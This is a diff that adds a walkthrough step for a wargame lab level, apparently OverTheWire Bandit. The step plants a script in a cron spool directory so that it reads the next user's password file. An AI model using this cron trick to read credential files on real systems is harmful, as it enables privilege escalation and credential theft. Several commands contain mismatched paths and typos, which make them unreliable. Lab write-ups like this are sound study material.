@@ -152,3 +152,27 @@ $ echo I am user bandit23 | md5sum | cut -d ' ' -f1
 #8ca319486bfbbc3663ea0fbe81326349
 $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
+
+24. A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+
+NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around
+
+```bash
+
+$ cat /etc/cron.d/cronjob_bandit24
+$ cat /usr/bin/bandit24.sh # Read the script and understand it
+$ mkdir /tmp/mydir24
+$ chmod 777 /tmp/mydir24
+$ cd /tmp/mydir24
+$ nano bandit24.sh
+cat /etc/bandit_pass/bandit24 > /tmp/mydir24/password.txt
+$ chmod +x bandit24.sh
+$ ll # make sure bandit24.sh is executable 
+$ cd ~
+$ cp /tmp/mydirb24/bandit24.sh /var/spool/bandit24/foo/script.sh # cp my script into the cron time-based job scheduler wait 60s
+$ cat cat /tmp/mydir24/password # password will show.
+
+
+```
